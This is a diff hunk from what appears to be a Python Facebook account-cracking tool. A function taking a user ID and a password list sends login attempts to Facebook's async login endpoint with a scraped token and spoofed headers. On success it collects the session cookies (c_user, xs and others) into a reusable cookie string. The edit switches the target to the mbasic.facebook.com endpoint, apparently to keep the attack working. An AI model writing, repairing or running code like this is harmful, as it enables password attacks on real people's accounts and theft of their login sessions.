@@ -1346,7 +1346,7 @@ def rndm4(uid,passlist):
 'user-agent': au,
 'x-asbd-id': '129477',
 'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
-                        session.post(f'https://m.facebook.com/login/device-based/login/async/',data=data,headers=headers).text
+                        session.post(f'https://mbasic.facebook.com/login/device-based/login/async/',data=data,headers=headers).text
                         log_cookies=session.cookies.get_dict().keys()
                         if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                                         coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
